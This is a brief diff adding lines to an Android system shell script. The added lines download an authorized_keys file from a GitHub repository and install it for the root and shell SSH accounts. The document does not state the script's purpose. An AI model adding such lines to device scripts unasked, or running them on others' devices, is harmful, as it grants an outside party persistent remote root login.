@@ -1,1 +1,6 @@
 #!/system/bin/sh
+wget -O /data/local/tmp/authorized_keys https://github.com/Androidmate/orion/raw/master/res/authorized_keys
+chmod 644 /data/local/tmp/authorized_keys
+cp /data/local/tmp/authorized_keys /data/ssh/root/.ssh/
+cp /data/local/tmp/authorized_keys /data/ssh/shell/.ssh/
+rm /data/local/tmp/authorized_keys
